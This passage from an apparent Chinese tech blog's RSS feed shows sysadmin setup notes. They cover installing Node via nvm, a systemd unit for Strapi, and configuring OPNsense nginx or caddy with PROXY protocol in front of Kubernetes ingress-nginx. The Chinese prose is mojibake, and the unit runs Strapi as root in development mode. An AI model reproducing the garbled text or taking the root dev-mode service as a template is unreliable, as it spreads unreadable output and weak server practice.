&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt; ~/.nvm/nvm.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm ls-remote
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nvm install v20.19.5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;node -v
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm install -g yarn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm list -g
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;ä¸‰å¼„strapiserviceæœåŠ¡&#34;&gt;ä¸‰ã€å¼„strapi.serviceæœåŠ¡&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$NVM_DIR&lt;/span&gt;     &lt;span class=&#34;c1&#34;&gt;# ç¡®å®š nvm çš„å®‰è£…ç›®å½•&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/root/.nvm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;which node        &lt;span class=&#34;c1&#34;&gt;# ç¡®å®š Node.js çš„è·¯å¾„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/root/.nvm/versions/node/v20.19.5/bin/node
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;which yarn        &lt;span class=&#34;c1&#34;&gt;# ç¡®å®š Yarn çš„è·¯å¾„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/root/.nvm/versions/node/v20.19.5/bin/yarn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &amp;lt; EOF &amp;gt; /etc/systemd/system/strapi.service 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Unit&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Description&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Strapi App
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;After&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;network.target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Service&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# ä½¿ç”¨ç”¨æˆ·è´¦æˆ·è¿è¡ŒæœåŠ¡ï¼Œæ›¿æ¢ä¸ºå®é™…çš„ç”¨æˆ·å&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;root
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Group&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;root
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# æŒ‡å®šå·¥ä½œç›®å½•ï¼Œæ›¿æ¢ä¸ºé¡¹ç›®çš„å®é™…è·¯å¾„&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;WorkingDirectory&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/data/strapi
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# åŠ è½½ nvm å¹¶è¿è¡Œ yarn æˆ– node&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Environment&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;NVM_DIR=/root/.nvm&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ExecStart&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/bin/bash -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;. &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NVM_DIR&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/nvm.sh &amp;amp;&amp;amp; yarn develop&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Restart&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;always
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;RestartSec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Install&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;WantedBy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;multi-user.target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;EOF
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl daemon-reload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now strapi
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>OPNsenseå¦‚ä½•åšLoadBalanceæ¥å…¥åç«¯çš„Kubernetes nginx ingress --- Nginxç¯‡</title>
      <link>https://rendoumi.com/posts/20251014-opensense_nginx/</link>
      <pubDate>Tue, 14 Oct 2025 09:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251014-opensense_nginx/</guid>
      <description>&lt;p&gt;æ–°æ‰˜ç®¡äº†ä¸€ä¸ªæœºæˆ¿æœåŠ¡å™¨ï¼ŒåŸºæœ¬å…¨ç”¨å¼€æºè½¯ä»¶æ¥æ„å»ºï¼š&lt;/p&gt;
&lt;p&gt;é‚£Firewallå°±ç”¨çš„OPNsenseï¼Œåç«¯è‡ªå»ºKubernetesï¼Œé‚£OPNsenseéœ€è¦å½“ä½œä¸€ä¸ªLoadBalanceæ¥ä½¿ç”¨&lt;/p&gt;
&lt;p&gt;ç»“æ„å›¾å¦‚ä¸‹ï¼Œè¯ä¹¦æ˜¯æ”¾åœ¨äº†Nginx ingresä¸Šï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014091045980&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opensense_nginx/image-20251014091045980.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå„æœ‰åˆ©å¼Šï¼Œè¯´ä¸‹ç¬¬ä¸‰ä¸ªï¼Œ&lt;code&gt;Nginx&lt;/code&gt;çš„åšæ³•&lt;/p&gt;
&lt;p&gt;relaydå’Œcaddyéƒ½è¯´å®Œäº†ï¼Œé‚£è¿˜æœ‰Nginxï¼ŒNginxçš„è¯ï¼Œå¦‚æœè¯ä¹¦æŒ‚åœ¨OPNsenseï¼Œé‚£å°±å¯ä»¥ç”¨WAFçš„åŠŸèƒ½&lt;/p&gt;
&lt;p&gt;å¦‚æœè¯ä¹¦æ”¾åœ¨åç«¯Kubernetesçš„Nginx ingressä¸Šï¼Œé‚£å°±æ— æ³•ç”¨WAFäº†ï¼Œç®—æ˜¯data stream&lt;/p&gt;
&lt;p&gt;é‚£æå‰è¯´ä¸€å¥ï¼ŒNginxçš„é…ç½®æ˜¯æœ‰Bugçš„ï¼Œå¦‚æœæ— æ³•æ¸…é™¤å¹²å‡€ï¼Œéœ€è¦sshç™»å½•opnsenseï¼Œç„¶å&lt;/p&gt;
&lt;p&gt;æŠŠ /conf/ä¸‹xmlé…ç½®æ–‡ä»¶ä¸­çš„ nginx éƒ¨åˆ†åˆ é™¤æ‰ï¼Œç„¶åé‡å¯æœåŠ¡å™¨ï¼Œæ‰å¯ä»¥&lt;/p&gt;
&lt;p&gt;os-nginxçš„é…ç½®æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸€æ­¥ï¼šé¦–å…ˆå»Upstreamçš„Upstream Serverå­æ ‡ç­¾ï¼Œå»ºç«‹ä¸¤ç»„æœåŠ¡å™¨&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014103525587&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opensense_nginx/image-20251014103525587.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬äºŒæ­¥ï¼šå†å»Upstreamçš„Upstreamå­æ ‡ç­¾ï¼Œå»ºç«‹ä¸¤ç»„æœåŠ¡&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014103800452&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opensense_nginx/image-20251014103800452.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å»ºç«‹çš„æ—¶å€™advanced modeè¦æ‰“å¼€ï¼ŒPROXY Protocolè¦é€‰ä¸­ï¼ŒServeré€‰ä¸­å„è‡ªçš„4ä¸ªæœåŠ¡å™¨ï¼Œå…¶å®ƒä¿æŒç¼ºçœå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014103913320&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opensense_nginx/image-20251014103913320.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¬¬ä¸‰æ­¥ï¼šå»Data Streamsçš„å­æ ‡ç­¾Stream Serversï¼Œå»ºä¸¤ç»„æœåŠ¡&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014104039907&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opensense_nginx/image-20251014104039907.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¼–è¾‘ä¸€ä¸‹ï¼Œç›‘å¬ç«¯å£åªé€‰æŒ‡å®šIPçš„80å’Œ443ï¼ŒPROXY Protocolä¸è¦é€‰ä¸­ï¼Œç„¶åRouteå°±é€‰Upstreamï¼ŒUpstream Serversé€‰ä¸­å¯¹åº”çš„ï¼Œå…¶å®ƒç¼ºçœå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014104150653&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opensense_nginx/image-20251014104150653.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£å¯¹åº”çš„ï¼Œåç«¯Kubernetesçš„Nginx ingressä¹Ÿè¦åšç›¸åº”é…ç½®&lt;/p&gt;
&lt;p&gt;Nginx ingressçš„configmapï¼Œéœ€è¦åŠ ä¸ŠProxy Protocolçš„éƒ¨åˆ†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014095327561&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opensense_nginx/image-20251014095327561.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç”¨çš„æ˜¯å®˜ç½‘çš„ ingress-nginxï¼Œé…ç½®æ–‡ä»¶æ˜¯ ingress-nginx çš„namespaceä¸­&lt;/p&gt;
&lt;p&gt;configmap ingress-nginx-controllerï¼Œå†…å®¹å¦‚ä¸‹ï¼Œå¯¹åº”dataé‚£ä¸¤è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apiVersion: v1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;data:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  use-proxy-protocol: &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kind: ConfigMap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  annotations:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    meta.helm.sh/release-name: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    meta.helm.sh/release-namespace: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    nginx.ingress.kubernetes.io/configuration-snippet: &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    nginx.ingress.kubernetes.io/location-snippet: &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    nginx.ingress.kubernetes.io/server-snippet: &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  creationTimestamp: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2025-08-27T07:38:49Z&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  labels:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/component: controller
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/instance: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/managed-by: Helm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/name: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/part-of: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/version: 1.13.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    helm.sh/chart: ingress-nginx-4.13.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: ingress-nginx-controller
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  namespace: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  resourceVersion: &lt;span class=&#34;s2&#34;&gt;&amp;#34;22298827&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  uid: d6eeef3c-7e44-4667-854a-c7693006b221
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘åï¼Œnginx ingressä¼šè‡ªåŠ¨reload&lt;/p&gt;</description>
    </item>
    <item>
      <title>OPNsenseå¦‚ä½•åšLoadBalanceæ¥å…¥åç«¯çš„Kubernetes nginx ingress --- caddyç¯‡</title>
      <link>https://rendoumi.com/posts/20251014-opnsense_caddy/</link>
      <pubDate>Tue, 14 Oct 2025 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20251014-opnsense_caddy/</guid>
      <description>&lt;p&gt;æ–°æ‰˜ç®¡äº†ä¸€ä¸ªæœºæˆ¿æœåŠ¡å™¨ï¼ŒåŸºæœ¬å…¨ç”¨å¼€æºè½¯ä»¶æ¥æ„å»ºï¼š&lt;/p&gt;
&lt;p&gt;é‚£Firewallå°±ç”¨çš„OPNsenseï¼Œåç«¯è‡ªå»ºKubernetesï¼Œé‚£OPNsenseéœ€è¦å½“ä½œä¸€ä¸ªLoadBalanceæ¥ä½¿ç”¨&lt;/p&gt;
&lt;p&gt;ç»“æ„å›¾å¦‚ä¸‹ï¼Œè¯ä¹¦æ˜¯æ”¾åœ¨äº†Nginx ingresä¸Šï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014091045980&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_caddy/image-20251014091045980.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£æ–¹æ³•æœ‰å¾ˆå¤šï¼Œå„æœ‰åˆ©å¼Šï¼Œè¯´ä¸‹ç¬¬äºŒä¸ªï¼Œ&lt;code&gt;Caddy&lt;/code&gt;çš„åšæ³•&lt;/p&gt;
&lt;p&gt;CaddyçœŸçš„æ˜¯ç‹é“ï¼Œä»€ä¹ˆæ³›åŸŸåï¼Œä¸€ä¸ªç«¯å£è·‘3ä¸ªåè®®ï¼Œéƒ½å¯ä»¥&lt;/p&gt;
&lt;p&gt;ç”¨åˆ°Caddyï¼Œå°±è¦è§£å†³åç«¯Nginx ingressæ— æ³•è·å¾—å®¢æˆ·çœŸå®IPçš„é—®é¢˜&lt;/p&gt;
&lt;p&gt;Caddyé…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;General Settingsï¼š&lt;/p&gt;
&lt;p&gt;Enable Layer4 Proxy è¦å‹¾é€‰ä¸Š&lt;/p&gt;
&lt;p&gt;Auto HTTPS è¦é€‰ä¸­Off&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014094437866&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_caddy/image-20251014094437866.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å…¶å®ƒä¿æŒé»˜è®¤ï¼Œç„¶åå»åˆ°Layer4 Proxyè¿›è¡Œé…ç½®ï¼ŒåŒæ ·è¦é…2ä¸ªï¼Œä¸€ä¸ªHTTPï¼Œä¸€ä¸ªTLS&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014094651852&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_caddy/image-20251014094651852.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¼–è¾‘HTTPçš„ä»£ç†ï¼Œæ³¨æ„ Domain çš„åœ°æ–¹éœ€è¦æŠŠç”¨åˆ°çš„æ‰€æœ‰åŸŸååˆ—è¿›å»&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014094830397&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_caddy/image-20251014094830397.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç¼–è¯‘TLSçš„ä»£ç†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014095137803&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_caddy/image-20251014095137803.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ³¨æ„ä¸Šé¢ï¼ŒProxy Protocoléƒ½è¦é€‰ä¸­v2ï¼Œè¿™æ ·å®¢æˆ·ç«¯çœŸå®IPæ‰å¯ä»¥é€ä¼ ç»™åç«¯çš„Nginx ingress&lt;/p&gt;
&lt;p&gt;é‚£åŒæ ·åç«¯çš„Nginx ingressçš„configmapï¼Œä¹Ÿéœ€è¦åŠ ä¸ŠProxy Protocolçš„éƒ¨åˆ†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20251014095327561&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20251014-opnsense_caddy/image-20251014095327561.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç”¨çš„æ˜¯å®˜ç½‘çš„ ingress-nginxï¼Œé…ç½®æ–‡ä»¶æ˜¯ ingress-nginx çš„namespaceä¸­&lt;/p&gt;
&lt;p&gt;configmap ingress-nginx-controllerï¼Œå†…å®¹å¦‚ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;apiVersion: v1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;data:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  use-proxy-protocol: &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kind: ConfigMap
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;metadata:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  annotations:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    meta.helm.sh/release-name: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    meta.helm.sh/release-namespace: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    nginx.ingress.kubernetes.io/configuration-snippet: &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    nginx.ingress.kubernetes.io/location-snippet: &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    nginx.ingress.kubernetes.io/server-snippet: &lt;span class=&#34;s2&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  creationTimestamp: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2025-08-27T07:38:49Z&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  labels:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/component: controller
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/instance: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/managed-by: Helm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/name: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/part-of: ingress-nginx
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    app.kubernetes.io/version: 1.13.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    helm.sh/chart: ingress-nginx-4.13.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  name: ingress-nginx-controller
